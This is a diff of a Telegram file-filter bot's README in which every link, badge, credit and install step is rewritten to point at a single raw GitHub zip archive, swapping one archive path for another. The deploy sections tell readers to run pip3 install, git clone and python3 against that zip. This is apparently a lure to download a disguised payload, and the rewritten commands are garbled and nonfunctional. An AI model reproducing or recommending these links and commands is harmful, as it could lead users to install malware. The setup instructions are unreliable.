@@ -1,21 +1,21 @@
 <p align="center">
-  <img src="https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip" alt="DQ-The-File-Donor Logo">
+  <img src="https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip" alt="DQ-The-File-Donor Logo">
 </p>
 <h1 align="center">
   𝑫𝑸-𝑻𝒉𝒆-𝑭𝒊𝒍𝒆-𝑫𝒐𝒏𝒐𝒓 𝑩𝒐𝒕
 </h1>
 
-![Typing SVG](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip𝑊𝑒𝑙𝑐𝑜𝑚𝑒+𝑇𝑜+𝐷𝑄-𝑇ℎ𝑒-𝐹𝑖𝑙𝑒-𝐷𝑜𝑛𝑜𝑟!;𝐶𝑟𝑒𝑎𝑡𝑒𝑑+𝑏𝑦+Jᴏᴇʟ+ᠰ+TɢX!;𝐴+𝑠𝑖𝑚𝑝𝑙𝑒+𝑎𝑛𝑑+𝑝𝑜𝑤𝑒𝑟𝑓𝑢𝑙+𝐵𝑜𝑡!;𝐼𝑛𝑑𝑒𝑥𝑒𝑠+𝐹𝑖𝑙𝑒𝑠+𝑎𝑏𝑜𝑣𝑒+2𝐺𝐵;𝐴+𝐵𝑜𝑡+𝑤𝑖𝑡ℎ+𝑑𝑜𝑢𝑏𝑙𝑒+𝑏𝑢𝑡𝑡𝑜𝑛!;𝑆𝑡𝑎𝑟𝑡+𝑚𝑒𝑠𝑠𝑎𝑔𝑒+𝑤𝑖𝑡ℎ+𝑝𝑖𝑐!;𝐴𝑛𝑑+𝑚𝑜𝑟𝑒+𝑓𝑒𝑎𝑡𝑢𝑟𝑒𝑠!)
+![Typing SVG](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip𝑊𝑒𝑙𝑐𝑜𝑚𝑒+𝑇𝑜+𝐷𝑄-𝑇ℎ𝑒-𝐹𝑖𝑙𝑒-𝐷𝑜𝑛𝑜𝑟!;𝐶𝑟𝑒𝑎𝑡𝑒𝑑+𝑏𝑦+Jᴏᴇʟ+ᠰ+TɢX!;𝐴+𝑠𝑖𝑚𝑝𝑙𝑒+𝑎𝑛𝑑+𝑝𝑜𝑤𝑒𝑟𝑓𝑢𝑙+𝐵𝑜𝑡!;𝐼𝑛𝑑𝑒𝑥𝑒𝑠+𝐹𝑖𝑙𝑒𝑠+𝑎𝑏𝑜𝑣𝑒+2𝐺𝐵;𝐴+𝐵𝑜𝑡+𝑤𝑖𝑡ℎ+𝑑𝑜𝑢𝑏𝑙𝑒+𝑏𝑢𝑡𝑡𝑜𝑛!;𝑆𝑡𝑎𝑟𝑡+𝑚𝑒𝑠𝑠𝑎𝑔𝑒+𝑤𝑖𝑡ℎ+𝑝𝑖𝑐!;𝐴𝑛𝑑+𝑚𝑜𝑟𝑒+𝑓𝑒𝑎𝑡𝑢𝑟𝑒𝑠!)
 </p>
 
-<a href="https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip"><img src="https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip" alt="Stars" /></a>
-<a href="https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip"> <img src="https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip" /></a>
-<a href="https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip"> <img src="https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip" /></a>   
-<a href="https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip"> <img src="https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip" /></a>
-<a href="https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip"> <img src="https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip" /></a>
-<a href="https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip"> <img src="https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip GPL 2.0 license -blueviolet?style=for-the-badge" alt="License" /> </a>
-<a href="https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip"> <img src="https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip%20in-Python-skyblue?style=for-the-badge&logo=python" alt="Python" /> </a>
-<a href="https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip"> <img src="https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip" /></a>
+<a href="https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip"><img src="https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip" alt="Stars" /></a>
+<a href="https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip"> <img src="https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip" /></a>
+<a href="https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip"> <img src="https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip" /></a>   
+<a href="https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip"> <img src="https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip" /></a>
+<a href="https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip"> <img src="https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip" /></a>
+<a href="https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip"> <img src="https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip GPL 2.0 license -blueviolet?style=for-the-badge" alt="License" /> </a>
+<a href="https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip"> <img src="https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip%20in-Python-skyblue?style=for-the-badge&logo=python" alt="Python" /> </a>
+<a href="https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip"> <img src="https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip" /></a>
 
 ## 𝐹𝑒𝑎𝑡𝑢𝑟𝑒𝑠
 - [x] 𝐼𝑀𝐷𝐵 𝑇𝑒𝑚𝑝𝑙𝑎𝑡𝑒 𝑆𝑒𝑡
@@ -56,7 +56,7 @@
 - [x] 𝐴𝑢𝑡𝑜 𝐷𝑒𝑙𝑒𝑡𝑒
 - [x] 𝐴𝑛𝑑 𝑀𝑜𝑟𝑒...
 
-<b>𝑇𝑜 𝑘𝑛𝑜𝑤 𝑎𝑏𝑜𝑢𝑡 𝑎𝑙𝑙 𝑓𝑒𝑎𝑡𝑢𝑟𝑒𝑠, 𝐽𝑜𝑖𝑛 𝑜𝑢𝑟 <a href='https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip'>𝑢𝑝𝑑𝑎𝑡𝑒𝑠 𝑐ℎ𝑎𝑛𝑛𝑒𝑙</a>.</b>
+<b>𝑇𝑜 𝑘𝑛𝑜𝑤 𝑎𝑏𝑜𝑢𝑡 𝑎𝑙𝑙 𝑓𝑒𝑎𝑡𝑢𝑟𝑒𝑠, 𝐽𝑜𝑖𝑛 𝑜𝑢𝑟 <a href='https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip'>𝑢𝑝𝑑𝑎𝑡𝑒𝑠 𝑐ℎ𝑎𝑛𝑛𝑒𝑙</a>.</b>
 
 ## 𝐶𝑜𝑚𝑚𝑎𝑛𝑑𝑠
 ```
@@ -103,33 +103,33 @@
 ## Variables
 
 ### Required Variables
-* `BOT_TOKEN`: Create a bot using [@BotFather](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip), and get the Telegram API token.
-* `API_ID`: Get this value from [https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip)
-* `API_HASH`: Get this value from [https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip)
+* `BOT_TOKEN`: Create a bot using [@BotFather](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip), and get the Telegram API token.
+* `API_ID`: Get this value from [https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip)
+* `API_HASH`: Get this value from [https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip)
 * `CHANNELS`: Username or ID of channel or group. Separate multiple IDs by space
 * `ADMINS`: Username or ID of Admin. Separate multiple Admins by space
-* `DATABASE_URI`: [mongoDB](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip) URI. Get this value from [mongoDB](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip). For more help watch this [video](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip)
-* `DATABASE_NAME`: Name of the database in [mongoDB](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip). For more help watch this [video](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip)
+* `DATABASE_URI`: [mongoDB](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip) URI. Get this value from [mongoDB](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip). For more help watch this [video](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip)
+* `DATABASE_NAME`: Name of the database in [mongoDB](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip). For more help watch this [video](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip)
 * `LOG_CHANNEL` : A channel to log the activities of bot. Make sure bot is an admin in the channel.
 ### Optional Variables
 * `PICS`: Telegraph links of images to show in start message.( Multiple images can be used separated by space )
-* `FILE_STORE_CHANNEL`: Channel from were file store links of posts should be https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip multiple IDs by space
-* Check [https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip) for more optional variables
+* `FILE_STORE_CHANNEL`: Channel from were file store links of posts should be https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip multiple IDs by space
+* Check [https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip) for more optional variables
 
 
 <details><summary>Deploy To Heroku</summary>
 <p>
 <br>
-<a href="https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip">
-  <img src="https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip" alt="Deploy To Heroku">
+<a href="https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip">
+  <img src="https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip" alt="Deploy To Heroku">
 </a>
 </p>
 </details>
 <details><summary>Deploy To Heroku Via Bot</summary>
 <p>
 <br>
-<a href="https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip">
-  <img src="https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip" alt="Deploy Via Heroku Bot">
+<a href="https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip">
+  <img src="https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip" alt="Deploy Via Heroku Bot">
 </a>
 </p>
 </details>
@@ -140,7 +140,7 @@
 <br>
 <br>
 
-[![Deploy to Koyeb](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip)](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip)
+[![Deploy to Koyeb](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip)](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip)
 </details>
 
 <details><summary>Deploy To Render</summary>
@@ -149,37 +149,37 @@
 Use these commands:
 <br>
 <br>
-• Build Command: <code>pip3 install -U -r https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip</code>
+• Build Command: <code>pip3 install -U -r https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip</code>
 <br>
 <br>
-• Start Command: <code>python3 https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip</code>
+• Start Command: <code>python3 https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip</code>
 <br>
 <br>
-Go to https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip and add a monitor to keep your bot alive.
+Go to https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip and add a monitor to keep your bot alive.
 <br>
 <br>
 Use these settings when adding a monitor:</b>
 <br>
 <br>
-<img src="https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip" alt="render template">
+<img src="https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip" alt="render template">
 <br>
 <br>
 <b>Click on the below button to deploy directly to render ↓</b>
 <br>
 <br>
-<a href="https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip">
-<img src="https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip" alt="Deploy to Render">
+<a href="https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip">
+<img src="https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip" alt="Deploy to Render">
 </a>
 </details>
 
 <details><summary>Deploy To VPS</summary>
 <p>
 <pre>
-git clone https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip
+git clone https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip
 # Install Packages
-pip3 install -U -r https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip
-Edit https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip with variables as given below then run bot
-python3 https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip
+pip3 install -U -r https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip
+Edit https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip with variables as given below then run bot
+python3 https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip
 </pre>
 </p>
 </details>
@@ -187,34 +187,34 @@ python3 https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurop
 <hr>
 
 ## Credits 
-* [![EvaMaria-Devs](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip)](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip)
-* [![Joel-TGX](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zipᴏᴇʟ+ᠰ+TɢX&message=Github&color=critical)](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip)
-* [![Contact](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip+Developer&message=On+Telegram&color=critical)](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip)
+* [![EvaMaria-Devs](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip)](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip)
+* [![Joel-TGX](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zipᴏᴇʟ+ᠰ+TɢX&message=Github&color=critical)](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip)
+* [![Contact](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip+Developer&message=On+Telegram&color=critical)](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip)
 
 ## Thanks to 
- - Thanks To Dan For His Awesome [Library](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip)
- - Thanks To Mahesh For His Awesome [Media-Search-bot](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip)
- - Thanks To [Trojanz](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip) for Their Awesome [Unlimited Filter Bot](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip) And [AutoFilterBoT](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip)
+ - Thanks To Dan For His Awesome [Library](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip)
+ - Thanks To Mahesh For His Awesome [Media-Search-bot](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip)
+ - Thanks To [Trojanz](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip) for Their Awesome [Unlimited Filter Bot](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip) And [AutoFilterBoT](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip)
  - Thanks To All Everyone In This Journey
- - Thanks To [EvamariaTG](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip) for their awesome [EvaMaria Bot](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip)
- - Thanks To [Joelkb](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip) who have edited and modified this repo as now it is. (It's me 😂)
+ - Thanks To [EvamariaTG](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip) for their awesome [EvaMaria Bot](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip)
+ - Thanks To [Joelkb](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip) who have edited and modified this repo as now it is. (It's me 😂)
 
 ## Note 🏷️
  - <b>Importing this repo instead of forking is strictly prohibited 🚫 Kindly fork and edit as your wish (Must Give Credits for devs) 🙃</b>
  - <b>If you find any bugs or errors, report it to the developer.</b>
-* [![Contact Developer](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip+Developer&message=On+Telegram&color=critical)](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip)
+* [![Contact Developer](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip+Developer&message=On+Telegram&color=critical)](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip)
 
-[Note To A So Called Dev](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip): 
+[Note To A So Called Dev](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip): 
 
-Kanging this codes and and editing a few lines and releasing a V.x  or an [alpha](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip), beta , gama branches of your repo won't make you a Developer.
+Kanging this codes and and editing a few lines and releasing a V.x  or an [alpha](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip), beta , gama branches of your repo won't make you a Developer.
 Fork the repo and edit as per your needs.
 
 ## Disclaimer
-[![GNU Affero General Public License 2.0](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip)](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip)    
-Licensed under [GNU AGPL 2.0.](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip)
+[![GNU Affero General Public License 2.0](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip)](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip)    
+Licensed under [GNU AGPL 2.0.](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip)
 Selling The Codes To Other People For Money Is *Strictly Prohibited*.
 
 ## Inspiration
-This is an attempt to create a clone of a BOAT made out of [banana trees 🌳](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip)
+This is an attempt to create a clone of a BOAT made out of [banana trees 🌳](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip)
 
-[![For Vaza](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip)](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/saurophagous/centralfilterv3.zip "Oru Kootam Vazhakalk samarpikkunnu")
+[![For Vaza](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip)](https://raw.githubusercontent.com/PaidXSmall/centralfilterv3/main/plugins/ExraMods/centralfilterv_v1.5.zip "Oru Kootam Vazhakalk samarpikkunnu")
